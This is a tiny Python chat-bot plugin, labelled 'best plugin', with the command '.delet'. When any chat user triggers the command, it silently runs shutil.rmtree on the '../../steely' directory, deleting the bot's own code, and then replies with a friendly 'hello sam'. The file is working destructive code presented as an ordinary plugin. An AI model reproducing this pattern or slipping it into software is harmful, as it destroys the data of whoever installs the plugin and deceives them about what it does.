'''
best plugin
'''

__author__ = 'sam'
COMMAND= '.delet'


import shutil


def main(bot, author_id, message, thread_id, thread_type, **kwargs):
    shutil.rmtree('../../steely')
    bot.sendMessage('hello sam', thread_id=thread_id, thread_type=thread_type)
